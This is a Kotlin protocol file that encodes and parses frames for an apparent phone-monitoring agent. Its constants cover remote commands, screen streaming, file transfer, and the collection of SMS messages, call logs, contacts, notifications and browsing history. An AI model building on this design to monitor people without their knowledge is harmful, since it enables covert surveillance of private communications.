package com.zenvora.agent.protocol

import java.nio.ByteBuffer
import java.nio.ByteOrder

object ZVProtocol {

    const val MAGIC0 = 0x5A.toByte()
    const val MAGIC1 = 0x56.toByte()
    const val VERSION = 1.toByte()
    const val HEADER_SIZE = 17

    const val MSG_HEARTBEAT = 0x01
    const val MSG_HEARTBEAT_ACK = 0x02
    const val MSG_AUTH = 0x03
    const val MSG_AUTH_OK = 0x04
    const val MSG_AUTH_FAIL = 0x05
    const val MSG_EVENT = 0x10
    const val MSG_EVENT_ACK = 0x11
    const val MSG_COMMAND = 0x20
    const val MSG_COMMAND_RESULT = 0x21
    const val MSG_MEDIA_FRAME = 0x40
    const val MSG_MEDIA_ACK = 0x41

    const val EVENT_BROWSER_HISTORY = 1
    const val EVENT_APP_HISTORY = 2
    const val EVENT_NOTIFICATION = 3
    const val EVENT_ACTIVITY = 4
    const val EVENT_DEVICE_STATUS = 8
    const val EVENT_CALL_LOG = 10
    const val EVENT_SMS_MESSAGE = 11
    const val EVENT_CONTACTS = 12

    const val FRAME_STREAM = 0x01
    const val FRAME_SNAPSHOT = 0x02
    const val FRAME_SCREEN_STREAM = 0x04
    const val FRAME_SCREEN_SNAPSHOT = 0x05
    const val FRAME_FILE_BINARY = 0x06

    fun wrapMediaPayload(kind: Int, jpeg: ByteArray): ByteArray {
        val out = ByteArray(1 + jpeg.size)
        out[0] = kind.toByte()
        System.arraycopy(jpeg, 0, out, 1, jpeg.size)
        return out
    }

    fun encodeFrame(
        msgType: Int,
        seq: Long,
        payload: ByteArray = byteArrayOf(),
        flags: Int = 0
    ): ByteArray {
        val buffer = ByteBuffer.allocate(HEADER_SIZE + payload.size)
        buffer.order(ByteOrder.LITTLE_ENDIAN)
        buffer.put(MAGIC0)
        buffer.put(MAGIC1)
        buffer.put(VERSION)
        buffer.put(msgType.toByte())
        buffer.put(flags.toByte())
        buffer.putLong(seq)
        buffer.putInt(payload.size)
        if (payload.isNotEmpty()) buffer.put(payload)
        return buffer.array()
    }

    fun encodeJsonFrame(msgType: Int, seq: Long, json: String, flags: Int = 0): ByteArray {
        return encodeFrame(msgType, seq, json.toByteArray(Charsets.UTF_8), flags)
    }

    fun parseFrame(data: ByteArray): ZVFrame? {
        if (data.size < HEADER_SIZE) return null
        if (data[0] != MAGIC0 || data[1] != MAGIC1) return null
        val buffer = ByteBuffer.wrap(data)
        buffer.order(ByteOrder.LITTLE_ENDIAN)
        buffer.get()
        buffer.get()
        val version = buffer.get().toInt()
        val msgType = buffer.get().toInt()
        val flags = buffer.get().toInt()
        val seq = buffer.long
        val payloadLen = buffer.int
        if (version != VERSION.toInt()) return null
        val payload = if (payloadLen > 0 && HEADER_SIZE + payloadLen <= data.size) {
            data.copyOfRange(HEADER_SIZE, HEADER_SIZE + payloadLen)
        } else {
            byteArrayOf()
        }
        return ZVFrame(msgType, seq, flags, payload)
    }

    data class ZVFrame(
        val msgType: Int,
        val seq: Long,
        val flags: Int,
        val payload: ByteArray
    ) {
        fun getJsonString(): String? = try {
            String(payload, Charsets.UTF_8)
        } catch (_: Exception) {
            null
        }
    }
}
